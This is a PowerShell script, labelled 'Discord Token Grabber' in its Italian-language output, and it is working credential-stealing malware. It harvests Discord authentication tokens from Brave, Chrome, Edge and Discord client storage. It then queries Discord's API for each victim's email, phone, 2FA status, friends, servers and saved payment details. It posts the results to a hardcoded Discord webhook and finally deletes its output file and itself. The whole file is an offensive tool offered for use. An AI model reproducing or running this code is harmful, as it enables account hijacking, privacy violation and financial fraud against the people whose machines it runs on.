$r = '[\w-]{24,26}\.[\w-]{6}\.[\w-]{25,110}'
$tokens = [System.Collections.Generic.HashSet[string]]::new()
$paths = @()

foreach ($sub in Get-ChildItem "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data" -Directory -EA SilentlyContinue) {
    $p = Join-Path $sub.FullName 'Local Storage\leveldb'
    if (Test-Path $p) { $paths += $p }
}
foreach ($sub in Get-ChildItem "$env:LOCALAPPDATA\Google\Chrome\User Data" -Directory -EA SilentlyContinue) {
    $p = Join-Path $sub.FullName 'Local Storage\leveldb'
    if (Test-Path $p) { $paths += $p }
}
foreach ($sub in Get-ChildItem "$env:LOCALAPPDATA\Microsoft\Edge\User Data" -Directory -EA SilentlyContinue) {
    $p = Join-Path $sub.FullName 'Local Storage\leveldb'
    if (Test-Path $p) { $paths += $p }
}
$paths += "$env:APPDATA\discord\Local Storage\leveldb"
$paths += "$env:APPDATA\discordcanary\Local Storage\leveldb"
$paths += "$env:APPDATA\discordptb\Local Storage\leveldb"

foreach ($path in $paths) {
    if (-not (Test-Path $path)) { continue }
    Write-Host "Scansione: $path" -ForegroundColor Gray
    foreach ($f in Get-ChildItem $path -Include '*.ldb','*.log' -Recurse -EA SilentlyContinue) {
        try {
            $b = [IO.File]::ReadAllBytes($f.FullName)
            $s = [Text.Encoding]::UTF8.GetString($b)
            foreach ($m in [regex]::Matches($s, $r)) {
                if ($m.Value.Length -gt 55) { [void]$tokens.Add($m.Value) }
            }
        } catch {}
    }
}

Write-Host ""
Write-Host "Trovati $($tokens.Count) token, verifico..." -ForegroundColor Cyan
Write-Host ""

$out = @("Discord Token Grabber - $(Get-Date -Format 'dd/MM/yyyy HH:mm')", "")
$valid = 0
$invalid = 0

foreach ($t in $tokens) {
    try {
        $resp = Invoke-WebRequest -Uri 'https://discord.com/api/v9/users/@me' -Headers @{ Authorization = $t } -UseBasicParsing -EA Stop
        $user = $resp.Content | ConvertFrom-Json

        $tag    = if ($user.discriminator -ne '0') { "$($user.username)#$($user.discriminator)" } else { $user.username }
        $nitro  = switch ($user.premium_type) { 0 {'Nessuno'} 1 {'Nitro Classic'} 2 {'Nitro'} 3 {'Nitro Basic'} default {'?'} }
        $email  = if ($user.email)        { $user.email }        else { 'N/A' }
        $phone  = if ($user.phone)        { $user.phone }        else { 'N/A' }
        $mfa    = if ($user.mfa_enabled)  { 'SI' }               else { 'NO' }
        $verify = if ($user.verified)     { 'SI' }               else { 'NO' }
        $locale = if ($user.locale)       { $user.locale }       else { 'N/A' }
        $bio    = if ($user.bio)          { $user.bio }          else { 'N/A' }
        $accent = if ($user.accent_color) { '#'+[Convert]::ToString($user.accent_color,16).ToUpper() } else { 'N/A' }
        $avatar = if ($user.avatar) { "https://cdn.discordapp.com/avatars/$($user.id)/$($user.avatar).png" } else { 'N/A' }
        $banner = if ($user.banner) { "https://cdn.discordapp.com/banners/$($user.id)/$($user.banner).png" } else { 'N/A' }

        try {
            $gresp  = Invoke-WebRequest -Uri 'https://discord.com/api/v9/users/@me/guilds' -Headers @{ Authorization = $t } -UseBasicParsing -EA Stop
            $guilds = $gresp.Content | ConvertFrom-Json
            $gcount = $guilds.Count
            $gnames = ($guilds | Select-Object -First 5 | ForEach-Object { $_.name }) -join ', '
            if ($gcount -gt 5) { $gnames += " ... (+$($gcount-5) altri)" }
        } catch { $gcount = 'N/A'; $gnames = 'N/A' }

        try {
            $fresp   = Invoke-WebRequest -Uri 'https://discord.com/api/v9/users/@me/relationships' -Headers @{ Authorization = $t } -UseBasicParsing -EA Stop
            $friends = ($fresp.Content | ConvertFrom-Json) | Where-Object { $_.type -eq 1 }
            $fcount  = $friends.Count
            $fnames  = ($friends | Select-Object -First 5 | ForEach-Object { $_.user.username }) -join ', '
            if ($fcount -gt 5) { $fnames += " ... (+$($fcount-5) altri)" }
        } catch { $fcount = 'N/A'; $fnames = 'N/A' }

        try {
            $presp    = Invoke-WebRequest -Uri 'https://discord.com/api/v9/users/@me/billing/payment-sources' -Headers @{ Authorization = $t } -UseBasicParsing -EA Stop
            $payments = $presp.Content | ConvertFrom-Json
            $payinfo  = ($payments | ForEach-Object {
                $type = switch ($_.type) { 1 {'Carta'} 2 {'PayPal'} default {'Altro'} }
                if ($_.type -eq 1) { "$type *$($_.last_4) exp $($_.expires_month)/$($_.expires_year) ($($_.billing_address.country))" }
                elseif ($_.type -eq 2) { "$type - $($_.paypal_email)" }
                else { $type }
            }) -join ' | '
            if (-not $payinfo) { $payinfo = 'Nessuno' }
        } catch { $payinfo = 'N/A' }

        Write-Host "[ATTIVO] $tag" -ForegroundColor Green

        $out += "========================================"
        $out += "[ATTIVO]"
        $out += "  Username   : $tag"
        $out += "  ID         : $($user.id)"
        $out += "  Email      : $email"
        $out += "  Verificato : $verify"
        $out += "  Telefono   : $phone"
        $out += "  Lingua     : $locale"
        $out += "  2FA        : $mfa"
        $out += "  Nitro      : $nitro"
        $out += "  Bio        : $bio"
        $out += "  Colore     : $accent"
        $out += "  Avatar     : $avatar"
        $out += "  Banner     : $banner"
        $out += "  Server     : $gcount totali | Primi 5: $gnames"
        $out += "  Amici      : $fcount totali | Primi 5: $fnames"
        $out += "  Pagamenti  : $payinfo"
        $out += "  Token      : $t"
        $out += ""
        $valid++

    } catch {
        Write-Host "[SCADUTO] $t" -ForegroundColor DarkGray
        $out += "========================================"
        $out += "[SCADUTO] Token: $t"
        $out += ""
        $invalid++
    }
}

$out += "========================================"
$out += "Attivi: $valid | Scaduti: $invalid"

Set-Content "$env:USERPROFILE\Documents\gorg.txt" $out -Encoding UTF8

$filePath = "$env:USERPROFILE\Documents\gorg.txt"
$webhookUrl = "https://canary.discord.com/api/webhooks/1480026770261676144/oH2jmQsrCqRXQfCJ4wtv_q2OIssIHA-MxsXcoHdb5l7aWzCeo9ASrNISFrn3ii3w_Xc-"

$fileBytes = [System.IO.File]::ReadAllBytes($filePath)
$fileContent = [System.Text.Encoding]::UTF8.GetString($fileBytes)

$boundary = [System.Guid]::NewGuid().ToString()
$body = "--$boundary`r`nContent-Disposition: form-data; name=`"file`"; filename=`"gorg.txt`"`r`nContent-Type: text/plain`r`n`r`n$fileContent`r`n--$boundary--"

Invoke-RestMethod -Uri $webhookUrl -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $body


Start-Sleep -Seconds 5
Remove-Item -LiteralPath "$env:USERPROFILE\Documents\gorg.txt" -Force

Start-Sleep -Seconds 2
Remove-Item -LiteralPath $PSCommandPath -Force


